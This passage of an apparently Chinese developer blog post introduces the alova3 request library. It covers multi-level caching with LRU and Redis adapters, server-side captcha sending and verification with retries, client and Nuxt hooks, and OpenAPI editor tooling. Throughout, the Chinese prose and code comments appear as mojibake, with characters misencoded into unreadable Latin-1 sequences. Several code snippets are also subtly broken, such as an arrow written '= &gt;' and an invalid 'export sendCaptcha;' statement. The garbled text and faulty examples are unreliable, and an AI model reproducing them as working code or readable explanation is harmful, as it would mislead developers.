    B --&gt;|æœªå‘½ä¸­| D{æ£€æŸ¥L2ç¼“å­˜}
    D --&gt;|å‘½ä¸­| E[æ›´æ–°L1ç¼“å­˜]
    D --&gt;|æœªå‘½ä¸­| F[è¯·æ±‚APIæ¥å£]
    F --&gt; G[æ›´æ–°L2ç¼“å­˜]
    E --&gt; C
    G --&gt; E
    C --&gt; H[ç»“æŸ]
</code></pre>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œalova çš„ä¸€çº§ç¼“å­˜æ˜¯ç®€å•çš„ object ä»¥ key-value çš„æ–¹å¼ç¼“å­˜ï¼Œè€ŒäºŒçº§ç¼“å­˜åœ¨ä¸åŒç¯å¢ƒä¸‹çš„é»˜è®¤è¡¨ç°ä¹Ÿä¸åŒï¼Œå…·ä½“çœ‹ä¸‹é¢ã€‚</p>
<h3 data-id="heading-1">å®¢æˆ·ç«¯</h3>
<p>åœ¨å®¢æˆ·ç«¯ç¯å¢ƒä¸‹ï¼Œä¸€çº§ç¼“å­˜ä¸€èˆ¬ç”¨äºçŸ­æ—¶çš„è¯·æ±‚æ•°æ®ç¼“å­˜ï¼Œä¾‹å¦‚å‡ åˆ†é’Ÿæˆ–å‡ ç§’é’Ÿçš„é¢‘ç¹è¯·æ±‚ç›¸åŒæ•°æ®å¸¦æ¥çš„æ€§èƒ½æ¶ˆè€—ï¼Œå½“ä½ åœ¨å†™ todo è¯¦æƒ…é¡µçš„æ—¶å€™ï¼Œä½ å¯èƒ½ä¼šæƒ³åˆ°ç”¨æˆ·ä¼šé¢‘ç¹åœ¨ todo åˆ—è¡¨ä¸­ç‚¹å‡»æŸ¥çœ‹è¯¦æƒ…ï¼Œæ­¤æ—¶ä½¿ç”¨ä¸€çº§ç¼“å­˜å¯ä»¥å¤§å¤§æå‡æ•ˆç‡ï¼Œé™ä½æœåŠ¡ç«¯å‹åŠ›ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¯¹è¯¦æƒ…æ•°æ®è®¾ç½®60ç§’çš„ä¸€çº§ç¼“å­˜</span>
alovaInstance.<span class="hljs-title class_">Get</span>(<span class="hljs-string">'/todo/detail'</span>, {
  <span class="hljs-attr">params</span>: {
    <span class="hljs-attr">id</span>: <span class="hljs-string">'xxx'</span>
  },
  <span class="hljs-attr">cacheFor</span>: <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>, <span class="hljs-comment">// è®¾ç½®60ç§’çš„ä¸€çº§ç¼“å­˜</span>
  <span class="hljs-comment">// ...</span>
});
</code></pre>
<p>è€ŒäºŒçº§ç¼“å­˜å¯ç”¨äºä¸€äº›æšä¸¾æ•°æ®ã€èŠ‚æ—¥ç­‰é•¿æœŸä¸å˜çš„è¯·æ±‚ä¸ºä¸»ï¼Œé»˜è®¤ä½¿ç”¨<code>localStorage</code>å­˜å‚¨ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¯¹æšä¸¾æ•°æ®è®¾ç½®3å¤©ç¼“å­˜æ—¶é—´</span>
alovaInstance.<span class="hljs-title class_">Get</span>(<span class="hljs-string">'/config/enum'</span>, {
  <span class="hljs-attr">params</span>: {
    <span class="hljs-attr">key</span>: <span class="hljs-string">'xxx'</span>
  },
  <span class="hljs-attr">cacheFor</span>: {
    <span class="hljs-attr">mode</span>: <span class="hljs-string">'restore'</span>,
    <span class="hljs-attr">expire</span>: <span class="hljs-number">3</span> * <span class="hljs-number">24</span> * <span class="hljs-number">3600</span> * <span class="hljs-number">1000</span> <span class="hljs-comment">// ç¼“å­˜3å¤©æ—¶é—´</span>
  }, 
});
</code></pre>
<h3 data-id="heading-2">æœåŠ¡ç«¯</h3>
<p>åœ¨æœåŠ¡ç«¯ç¯å¢ƒä¸‹ï¼Œå¤šçº§ç¼“å­˜æœºåˆ¶ç‰¹åˆ«é€‚ç”¨äºä»¥ä¸‹åœºæ™¯ï¼š</p>
<ol>
<li>
<p><strong>é«˜è®¿é—®é¢‘ç‡å’Œä½å»¶è¿Ÿéœ€æ±‚</strong>ï¼šä¾‹å¦‚çƒ­é—¨æ–°é—»ã€å•†å“è¯¦æƒ…ï¼Œå¯ä»¥è¿›ä¸€æ­¥å‡å°‘ç½‘ç»œå¼€é”€ï¼Œåœ¨ç½‘ç»œä¸ç¨³å®šæ—¶ä¹Ÿä¿æŒæ›´å¿«çš„å“åº”ã€‚</p>
</li>
<li>
<p><strong>å‡è½»ä¸‹æ¸¸æœåŠ¡å™¨å‹åŠ›</strong>ï¼šä¾‹å¦‚æœ‰è®¿é—®é«˜å³°æœŸçš„æœåŠ¡ï¼Œä¸Šå±‚ç¼“å­˜å¯ä»¥æœ‰æ•ˆå‡å°‘å¯¹åç«¯æ•°æ®åº“å’Œå¾®æœåŠ¡çš„å‹åŠ›ã€‚</p>
</li>
<li>
<p><strong>æ•´åˆå¤šä¸ªä¸‹æ¸¸æœåŠ¡å™¨çš„æ•°æ®åˆå¹¶å’Œå¤„ç†</strong>ï¼šå¤šä¸ªä¸²è¡Œè¯·æ±‚å¯èƒ½å¯¼è‡´æ›´é•¿çš„å“åº”æ—¶é—´ï¼Œä¹Ÿå¯èƒ½å› å¤æ‚çš„æ•°æ®è½¬æ¢æ¶ˆè€—æ€§èƒ½ï¼Œå¯å°†è½¬æ¢åçš„æ•°æ®è¿›è¡Œç¼“å­˜ã€‚</p>
</li>
<li>
<p><strong>API é€Ÿç‡é™åˆ¶å’Œè®¡è´¹</strong>ï¼šå¤©æ°”é¢„æŠ¥æœåŠ¡ API æ¯å°æ—¶æ›´æ–°ä¸€æ¬¡å¤©æ°”ä¿¡æ¯ï¼Œåœ°ç†ä½ç½®æ•°æ® API ç­‰ã€‚</p>
</li>
<li>
<p><strong>é‰´æƒæ•°æ®</strong>ï¼šç”¨æˆ·tokenç­‰æ•°æ®ç¼“å­˜åˆ°å†…å­˜ä¸­ï¼Œé¿å…é¢‘ç¹çš„é‰´æƒæ“ä½œã€‚</p>
</li>
<li>
<p><strong>è¯·æ±‚é€Ÿç‡é™åˆ¶ç­‰åˆ†å¸ƒå¼æ•°æ®</strong>ï¼šç”¨æˆ·çš„è¯·æ±‚æ¬¡æ•°é™åˆ¶ç­‰æ•°æ®ã€‚</p>
</li>
</ol>
<p>å…·ä½“å¯ä»¥çœ‹<a href="https://juejin.cn/post/7578820431018622991?share_token=0ebefce4-4817-450a-bae9-191040529eb6" target="_blank" title="https://juejin.cn/post/7578820431018622991?share_token=0ebefce4-4817-450a-bae9-191040529eb6">è¿™ç¯‡æ–‡ç« </a></p>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨è¿›ç¨‹é—´å†…å­˜å…±äº«é€‚é…å™¨åŠ  LRU cache ä½œä¸ºä¸€çº§ç¼“å­˜ï¼Œredis ä½œä¸ºäºŒçº§ç¼“å­˜çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> { createPSCAdapter, <span class="hljs-title class_">NodeSyncAdapter</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'@alova/psc'</span>);
<span class="hljs-keyword">const</span> { <span class="hljs-title class_">LRUCache</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lru-cache'</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title class_">RedisStorageAdapter</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./adapter-redis'</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">lRUCache</span>(<span class="hljs-params">options = {}</span>) {
  <span class="hljs-keyword">const</span> cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LRUCache</span>(options);
  <span class="hljs-keyword">return</span> {
    <span class="hljs-title function_">set</span>(<span class="hljs-params">key, value</span>) {
      <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">set</span>(key, value);
    },

    <span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>) {
      <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">get</span>(key);
    },

    <span class="hljs-title function_">remove</span>(<span class="hljs-params">key</span>) {
      <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">delete</span>(key);
    },

    <span class="hljs-title function_">clear</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">clear</span>();
    }
  };
}

<span class="hljs-keyword">const</span> alovaInstance = <span class="hljs-title function_">createAlova</span>({
  <span class="hljs-comment">// ...</span>

  <span class="hljs-comment">// è¿›ç¨‹é—´å…±äº«ç¼“å­˜é€‚é…å™¨</span>
  <span class="hljs-attr">l1Cache</span>: <span class="hljs-title function_">createPSCAdapter</span>(
    <span class="hljs-title class_">NodeSyncAdapter</span>(),
    <span class="hljs-title function_">lRUCache</span>({
      <span class="hljs-attr">max</span>: <span class="hljs-number">1000</span>,
      <span class="hljs-attr">ttl</span>: <span class="hljs-number">1000</span> * <span class="hljs-number">60</span> * <span class="hljs-number">10</span>
    })
  ),

  <span class="hljs-comment">// redisç¼“å­˜é€‚é…å™¨</span>
  <span class="hljs-attr">l2Cache</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisStorageAdapter</span>({
    <span class="hljs-attr">host</span>: <span class="hljs-string">'localhost'</span>,
    <span class="hljs-attr">port</span>: <span class="hljs-number">6379</span>,
    <span class="hljs-attr">username</span>: <span class="hljs-string">'default'</span>,
    <span class="hljs-attr">password</span>: <span class="hljs-string">'my-top-secret'</span>,
    <span class="hljs-attr">db</span>: <span class="hljs-number">0</span>
  })
});
</code></pre>
<p>é€šè¿‡å¤šçº§ç¼“å­˜æœºåˆ¶ï¼Œalova3èƒ½å¤Ÿå®ç°ï¼š</p>
<ul>
<li><strong>å“åº”æ—¶é—´å‡å°‘80%+</strong>ï¼šé€šè¿‡å†…å­˜ç¼“å­˜å®ç°æ¯«ç§’çº§å“åº”</li>
<li><strong>æœåŠ¡å™¨è´Ÿè½½é™ä½60%+</strong>ï¼šå‡å°‘ä¸å¿…è¦çš„APIè°ƒç”¨</li>
<li><strong>ç¦»çº¿ä½“éªŒä¼˜åŒ–</strong>ï¼šæŒä¹…åŒ–ç¼“å­˜æ”¯æŒå®Œæ•´çš„ç¦»çº¿åŠŸèƒ½</li>
<li><strong>å¸¦å®½èŠ‚çº¦</strong>ï¼šå‡å°‘é‡å¤æ•°æ®ä¼ è¾“</li>
</ul>
<p>è¿™ç§å¤šçº§ç¼“å­˜æ¶æ„ä½¿å¾—alova3ç‰¹åˆ«é€‚åˆéœ€è¦é«˜æ€§èƒ½æ•°æ®è®¿é—®çš„ç°ä»£Webåº”ç”¨ï¼Œåœ¨å¾®æœåŠ¡æ¶æ„å’Œåˆ†å¸ƒå¼ç³»ç»Ÿä¸­ä¹Ÿè¡¨ç°å‡ºè‰²ã€‚</p>
<h2 data-id="heading-3">äºŒã€å…¨æ ˆçš„è¯·æ±‚ç­–ç•¥</h2>
<h3 data-id="heading-4">æœåŠ¡ç«¯è¯·æ±‚ç­–ç•¥</h3>
<p>alova3ä¸€ä¸ªå…³é”®ç‰¹æ€§æ˜¯å¼•å…¥äº†å¯¹æœåŠ¡ç«¯çš„å®Œæ•´æ”¯æŒï¼Œä½ ä¸ä»…å¯ä»¥åœ¨nodejsã€denoã€bunç­‰è¿è¡Œæ—¶ä¸­ä½¿ç”¨ï¼Œè¿˜æä¾›äº†ç‹¬æœ‰çš„æœåŠ¡ç«¯è¯·æ±‚ç­–ç•¥ï¼Œç®€ç§°server hooksï¼Œå®ƒå¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¤„ç†åˆ†å¸ƒå¼çš„BFFã€APIç½‘å…³ã€ç¬¬ä¸‰æ–¹tokenç®¡ç†ç­‰ï¼ŒåŒæ—¶è¿˜æœ‰è¯·æ±‚é€Ÿç‡é™åˆ¶ã€è¯·æ±‚é‡è¯•ã€éªŒè¯ç å‘é€ä¸æ ¡éªŒç­‰æ¨¡å—ï¼Œå¯ä»¥å¿«é€Ÿå®ç°åˆ†å¸ƒå¼çš„ç‰¹å®šä¸šåŠ¡é€»è¾‘ã€‚</p>
<p>BFFã€APIç½‘å…³ã€ç¬¬ä¸‰æ–¹tokenç®¡ç†ç­‰ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.alova.cn%2Fdocs%2Fserver-hooks" target="_blank" title="https://www.alova.cn/docs/server-hooks" ref="nofollow noopener noreferrer">è¿™ç¯‡æ–‡ç« </a>ä¸­æœ‰è¯¦ç»†çš„ä»‹ç»ï¼Œè¿™è¾¹æˆ‘ä»¬æ¥çœ‹çœ‹éªŒè¯ç å‘é€æ ¡éªŒæ¨¡å—çš„ä½¿ç”¨ã€‚</p>
<p>æŒ‰ç…§æƒ¯ä¾‹ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªalovaå®ä¾‹ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> { createAlova } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'alova/server'</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title class_">RedisStorageAdapter</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'@alova/storage-redis'</span>);
<span class="hljs-keyword">const</span> adapterFetch = <span class="hljs-built_in">require</span>(<span class="hljs-string">'alova/fetch'</span>);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> alovaInstance = <span class="hljs-title function_">createAlova</span>({
  <span class="hljs-comment">// ...</span>
  <span class="hljs-attr">requestAdapter</span>: <span class="hljs-title function_">adapterFetch</span>(),
  <span class="hljs-comment">// redisç¼“å­˜é€‚é…å™¨</span>
  <span class="hljs-attr">l2Cache</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisStorageAdapter</span>({
    <span class="hljs-attr">host</span>: <span class="hljs-string">'localhost'</span>,
    <span class="hljs-attr">port</span>: <span class="hljs-number">6379</span>,
    <span class="hljs-attr">username</span>: <span class="hljs-string">'default'</span>,
    <span class="hljs-attr">password</span>: <span class="hljs-string">'my-top-secret'</span>,
    <span class="hljs-attr">db</span>: <span class="hljs-number">0</span>
  })
});
</code></pre>
<p>ç„¶åå†åˆ›å»ºä¸€ä¸ªéªŒè¯ç æä¾›è€…å‡½æ•°ï¼Œå¹¶æŒ‡å®šä½¿ç”¨redisé€‚é…å™¨ä½œä¸ºç¼“å­˜è½½ä½“ï¼Œä»¥ä¾¿å®ç°åˆ†å¸ƒå¼ç¯å¢ƒä¸‹çš„ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> { createCaptchaProvider } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'alova/server'</span>);

<span class="hljs-keyword">const</span> { sendCaptcha, verifyCaptcha } = <span class="hljs-title function_">createCaptchaProvider</span>({
  <span class="hljs-attr">store</span>: alovaInstance.<span class="hljs-property">options</span>.<span class="hljs-property">l2Cache</span>
});

<span class="hljs-keyword">export</span> sendCaptcha;
<span class="hljs-keyword">export</span> verifyCaptcha;
</code></pre>
<p>ç¬¬ä¸‰æ­¥ï¼Œå†å‘é€éªŒè¯ç ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<code>retry</code>æ¥å®ç°é‡è¯•ï¼Œæé«˜æˆåŠŸç‡ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå‘é€éªŒè¯ç çš„methodå®ä¾‹</span>
<span class="hljs-keyword">const</span> createCaptchaMethod = (code, key) = &gt; alovaInstance.<span class="hljs-title class_">Post</span>(<span class="hljs-string">'/api/captcha'</span>, {
  code,
  <span class="hljs-attr">email</span>: key,
});

<span class="hljs-comment">// ä½¿ç”¨sendCaptcha hookåŒ…è£…createCaptchaMethod</span>
<span class="hljs-keyword">const</span> captchaMethod = <span class="hljs-title function_">sendCaptcha</span>(createCaptchaMethod, {
  <span class="hljs-attr">key</span>: <span class="hljs-string">'xxx@xxx.com'</span>
});

<span class="hljs-comment">// ä½¿ç”¨retry hookåŒ…è£…captchaMethodï¼Œå¹¶é€šè¿‡awaitå‘é€è¯·æ±‚å¹¶è·å–å“åº”ç»“æœ</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">retry</span>(captchaMethod, {
  <span class="hljs-attr">retry</span>: <span class="hljs-number">3</span>,
  <span class="hljs-attr">backoff</span>: {
    <span class="hljs-attr">delay</span>: <span class="hljs-number">2000</span>
  }
});
</code></pre>
<p>æœ€åä¸€æ­¥ï¼Œé€šè¿‡ç”¨æˆ·çš„æäº¤æ¥éªŒè¯éªŒè¯ç ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> fakeCaptchaFromUserInput = <span class="hljs-string">'1234'</span>;
<span class="hljs-keyword">const</span> isValid = <span class="hljs-keyword">await</span> <span class="hljs-title function_">verifyCaptcha</span>(fakeCaptchaFromUserInput, key);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(isValid ? <span class="hljs-string">'éªŒè¯é€šè¿‡'</span> : <span class="hljs-string">'éªŒè¯ç é”™è¯¯'</span>);
</code></pre>
<h3 data-id="heading-5">å®¢æˆ·ç«¯çš„è¯·æ±‚ç­–ç•¥</h3>
<p>alova3çš„å®¢æˆ·ç«¯è¯·æ±‚ç­–ç•¥ä¸ä¹‹å‰çš„ç‰ˆæœ¬å¤§ç›¸å¾„åº­ï¼Œä¾ç„¶æä¾›äº†<code>useRequest</code>ã€<code>useWatcher</code>ã€<code>usePagination</code>ç­‰UIæ¡†æ¶ç›¸å…³çš„hooksï¼Œåœ¨è¿™é‡Œå¤§å®¶åº”è¯¥éƒ½å¾ˆç†Ÿæ‚‰äº†ï¼Œä½†ä¸åŒçš„æ˜¯ï¼Œæ— è®ºä½ ä½¿ç”¨reactã€vueè¿˜æ˜¯svelteï¼Œè¿™äº›hookéƒ½ç”±ç»Ÿä¸€çš„<code>alova/client</code>ä¸­å¯¼å…¥ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { useRequest } <span class="hljs-keyword">from</span> <span class="hljs-string">'alova/client'</span>;

<span class="hljs-keyword">const</span> { data, loading, error, send } = <span class="hljs-title function_">useRequest</span>(alovaInstance.<span class="hljs-title class_">Get</span>(<span class="hljs-string">'/todo/list'</span>));
</code></pre>
<h3 data-id="heading-6">å…¨æ ˆæ¡†æ¶nuxtæ”¯æŒ</h3>
<p>è™½ç„¶åœ¨ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œalovaå·²ç»æ”¯æŒåœ¨nextã€nuxtã€svelitekitç­‰SSRæ¡†æ¶ä¸­ä½¿ç”¨ï¼Œä¸è¿‡åœ¨alova3ä¸­ï¼Œæä¾›äº†ä¸€ä¸ªä¸“é—¨é€‚é…nuxtçš„statesHookï¼Œå¯ä»¥åœ¨ä½¿ç”¨<code>useRequest</code>ã€<code>useWatcher</code>ç­‰å‡ ä¹æ‰€æœ‰çš„hooksæ—¶ä¸ä»…å¯ä»¥åŒæ­¥ä¸¤ç«¯çš„æ•°æ®ï¼Œåƒå†…ç½®çš„<code>useFetch</code>ä¸€æ ·é¿å…åœ¨å®¢æˆ·ç«¯é‡å¤è¯·æ±‚ï¼Œè¿˜å¯ä»¥åŒæ­¥ä¾‹å¦‚<code>Date</code>ï¼Œ<code>Error</code>ç­‰ä»¥åŠè‡ªå®šä¹‰ç±»å‹çš„æ•°æ®ï¼Œç”¨æ³•ä¹Ÿéå¸¸ç®€å•ï¼Œè®¾ç½®ä¸€ä¸‹<code>NuxtHook</code>å³å¯ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { createAlova } <span class="hljs-keyword">from</span> <span class="hljs-string">'alova'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">NuxtHook</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'alova/nuxt'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> alovaInstance = <span class="hljs-title function_">createAlova</span>({
  <span class="hljs-comment">// ...</span>
  <span class="hljs-attr">statesHook</span>: <span class="hljs-title class_">NuxtHook</span>({
    <span class="hljs-attr">nuxtApp</span>: useNuxtApp <span class="hljs-comment">// å¿…é¡»æŒ‡å®šuseNuxtApp</span>
  })
});
</code></pre>
<h2 data-id="heading-7">ä¸‰ã€å·¥å…·é“¾æ”¯æŒï¼šæ›´åŠ ç°ä»£åŒ–çš„OpenAPIå·¥å…·</h2>
<p>é™¤äº†æ ¸å¿ƒåº“çš„å¢å¼ºï¼Œalova3è¿˜æä¾›äº†å¼€å‘å·¥å…·å’Œvscodeæ‰©å±•æ¥ä¼˜åŒ–å·¥ä½œæµã€‚</p>
<p>å¦‚æœä½ çš„é¡¹ç›®æ”¯æŒopenapiï¼Œè¿™äº›å¼€å‘å·¥å…·å¯ä»¥åŸºæœ¬æ¶ˆé™¤APIæ–‡æ¡£ï¼Œè®©ä½ ç›´æ¥åœ¨ç¼–è¾‘å™¨ä¸­æŸ¥æ‰¾æ¥å£ã€æŸ¥çœ‹å®Œæ•´æ–‡æ¡£å¹¶äº¤äº’å¼åœ°å¿«é€Ÿæ’å…¥æ¥å£çš„è°ƒç”¨ä»£ç ï¼Œå¾ˆå¤§ç¨‹åº¦åœ°æå‡äº†å¼€å‘æ•ˆç‡å’Œä½“éªŒã€‚</p>
<p>åŒæ—¶ï¼Œä½ è¿˜å¯ä»¥å®Œå…¨æ§åˆ¶openapiåœ¨å‰ç«¯ç”Ÿæˆçš„å†…å®¹ï¼Œä¾‹å¦‚è¿‡æ»¤æ‰æŸäº›æ¥å£ï¼Œæ–°å¢ã€åˆ é™¤æˆ–ä¿®æ”¹æŸä¸ªæ¥å£çš„å‚æ•°ç­‰ï¼Œè¿™äº›åœ¨openapiæ–‡ä»¶ä¸å¤Ÿè§„èŒƒï¼Œæˆ–è€…æœ‰é”™è¯¯æ—¶éå¸¸æœ‰ç”¨ï¼Œå¹¶ä¸”æ˜¯å…¶ä»–openapiè‡ªåŠ¨ç”Ÿæˆå·¥å…·æ‰€ä¸å…·å¤‡çš„ã€‚</p>
<p>ä¸€èµ·æ¥å…·ä½“çœ‹çœ‹æ€ä¹ˆå›äº‹ã€‚</p>
<h3 data-id="heading-8">å¿«é€ŸæŸ¥æ‰¾å’Œæ’å…¥è°ƒç”¨ä»£ç </h3>
<h3 data-id="heading-9">è‡ªå®šä¹‰ä¿®æ”¹ç”Ÿæˆå†…å®¹</h3>
<p>åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯çš„è¿”å›æ•°æ®æ ¼å¼ä¼šå¤–åŒ…ä¸€å±‚ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-attr">code</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">message</span>: <span class="hljs-string">"success"</span>,
  <span class="hljs-attr">data</span>: {
    <span class="hljs-comment">// ...</span>
  }
}
</code></pre>
<p>è€Œæ­¤æ—¶æˆ‘ä»¬å¸Œæœ›ç”Ÿæˆçš„å“åº”æ•°æ®ç±»å‹ä¸º<code>response.data</code>ï¼Œä½ å¯ä»¥åœ¨alovaé…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨<code>payloadModifier</code>æ’ä»¶ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'@alova/wormhole'</span>;
<span class="hljs-keyword">import</span> { payloadModifier } <span class="hljs-keyword">from</span> <span class="hljs-string">'@alova/wormhole/plugin'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">generator</span>: [
    {
      <span class="hljs-comment">// ...</span>
      <span class="hljs-attr">plugin</span>: [
        <span class="hljs-title function_">payloadModifier</span>([
          {
            <span class="hljs-attr">scope</span>: <span class="hljs-string">'response'</span>,
            <span class="hljs-attr">handler</span>: <span class="hljs-function"><span class="hljs-params">schema</span> =&gt;</span> schema.<span class="hljs-property">data</span>
          }
        ])
      ]
    }
  ]
});
</code></pre>
<p>ä½ ä¹Ÿè¿˜å¯ä»¥é€šè¿‡<code>handleApi</code>å®ç°å®Œå…¨çš„è‡ªå®šä¹‰ï¼Œä¾‹å¦‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªä¿®æ”¹tagçš„ä¾‹å­ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">generator</span>: [
    {
      <span class="hljs-attr">handleApi</span>: <span class="hljs-function"><span class="hljs-params">apiDescription</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (apiDescription.<span class="hljs-property">url</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/user'</span>)) {
          apiDescription.<span class="hljs-property">tags</span> = [<span class="hljs-string">'userTag'</span>];
        }
        <span class="hljs-keyword">return</span> apiDescription;
      }
    }
  ]
});
</code></pre>
<h3 data-id="heading-10">è¾¹æŸ¥è¾¹æ¥å…¥æ¥å£</h3>
<p>ä½¿ç”¨alovaçš„vscodeæ‰©å±•ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨ç¼–è¾‘å™¨ä¸­æŸ¥æ‰¾æ¥å£ï¼Œå¹¶ç›´æ¥æ’å…¥è°ƒç”¨ä»£ç ï¼Œä¸ä»…å¦‚æ­¤ï¼Œæ¥å£çš„æ‰€æœ‰ç›¸å…³ä¿¡æ¯éƒ½å¯ä»¥ç›´æ¥åœ¨ä»£ç ä¸­æŸ¥çœ‹ï¼Œåƒè¿™æ ·ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf48e785e23b487eac71aa3b41a98ea6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-k6Z-1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765931728&amp;x-signature=3QJ%2FgaMng%2FpTCDoERIcQXiTqgi4%3D" alt="image.png" loading="lazy"/></p>
<p>å¼¹æ¡†ä¸­èƒ½æ¸…æ¥šçš„çœ‹åˆ°æ¥å£çš„æè¿°ä¿¡æ¯ã€è¯·æ±‚å‚æ•°ã€å“åº”å‚æ•°ç­‰ï¼Œä½ å¯ä»¥ä¸€è¾¹çœ‹ç€å¼¹æ¡†ä¸­çš„å‚æ•°ï¼Œä¸€è¾¹åœ¨ä»£ç ä¸­ä¼ å‚ï¼Œè¿™ä¸ªç‚¹å­å¤ªæ£’å•¦ï¼Œå†ä¹Ÿä¸ç”¨åœ¨apiæ–‡æ¡£å’Œç¼–è¾‘å™¨ä¸­æ¥å›åˆ‡æ¢ï¼Œç„¶åæ¯æ¬¡è¿˜è¦é‡æ–°æ‰¾å¯¹åº”ä¿¡æ¯äº†ã€‚</p>
<h3 data-id="heading-11">ç¼–è¾‘å™¨ä¸­çš„apiæ–‡æ¡£</h3>
<p>è¿™ä¸ªvscodeæ‰©å±•è¿˜æä¾›äº†åœ¨ç¼–è¾‘å™¨ä¸­æŸ¥çœ‹æ¥å£æ–‡æ¡£çš„åŠŸèƒ½ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨ç¼–è¾‘çš„ä¾§è¾¹æ ä¸­æŸ¥çœ‹æ¥å£æ–‡æ¡£ï¼Œå°±åƒè¿™æ ·ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f1d07da3dfe49b7ac83c6401f3b9048~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-k6Z-1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765931728&amp;x-signature=R3G9Glf0284RekqbQLBZ1n3cIPI%3D" alt="" loading="lazy"/></p>
<p>ä¹Ÿå¯ä»¥åœ¨ä»£ç ä¸­çš„è°ƒç”¨ä»£ç ä¸Šç›´æ¥ç‚¹å‡»â€œview documentationâ€æ‰“å¼€å¯¹åº”çš„æ¥å£æ–‡æ¡£ï¼Œå¯ä»¥å®ç°å¿«é€ŸæŸ¥çœ‹æ¥å£çš„æè¿°ä¿¡æ¯ã€è¯·æ±‚å‚æ•°ã€å“åº”å‚æ•°ç­‰ã€‚</p>
<h2 data-id="heading-12">å†™åœ¨æœ€å</h2>
<p>åˆ°è¿™é‡Œï¼Œä½ åº”è¯¥æ„Ÿå—åˆ°äº†ä¸€ç‚¹alova3çš„ä¸åŒäº†å§ï¼Œé€šè¿‡ä»¥ä¸Šçš„æ–¹å¼è®©å‰ç«¯åœ¨æ¥å£é›†æˆæ–¹å‘å¾ˆå¤§ç¨‹åº¦åœ°æå‡æ•ˆç‡ï¼Œæ— è®ºä½ æ˜¯å‰ç«¯å¼€å‘è€…å¸Œæœ›æå‡åº”ç”¨æ€§èƒ½ï¼Œè¿˜æ˜¯åç«¯å·¥ç¨‹å¸ˆéœ€è¦æ„å»ºé«˜æ•ˆçš„APIç½‘å…³ï¼Œäº¦æˆ–æ˜¯å…¨æ ˆå¼€å‘è€…è¿½æ±‚ç»Ÿä¸€çš„å¼€å‘ä½“éªŒï¼Œalova3éƒ½èƒ½ä¸ºä½ æä¾›å®Œæ•´çš„æ”¯æŒã€‚</p>
